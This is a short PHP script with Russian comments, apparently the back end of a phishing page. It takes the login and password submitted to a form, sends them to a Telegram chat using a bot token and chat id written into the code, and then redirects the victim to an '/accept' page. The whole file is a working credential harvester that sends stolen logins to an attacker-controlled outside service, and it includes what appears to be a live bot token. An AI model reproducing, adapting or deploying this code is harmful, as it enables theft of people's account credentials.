<?
$login = trim($_POST['login']);
$pass = trim($_POST['pass']);


$token = "1694421359:AAHZSsFiXfQzYoRVuywTpQQvmWgpQ_jZz7g"; // токен бота
$chatid = '1038162734'; // id чата 1


// отправка сообщения
$tbot = file_get_contents("https://api.telegram.org/bot".$token."/sendMessage?chat_id=".$chatid."&text=".urlencode("Логин:  $login\nПароль:  $pass"));
header("Location: /accept")
?>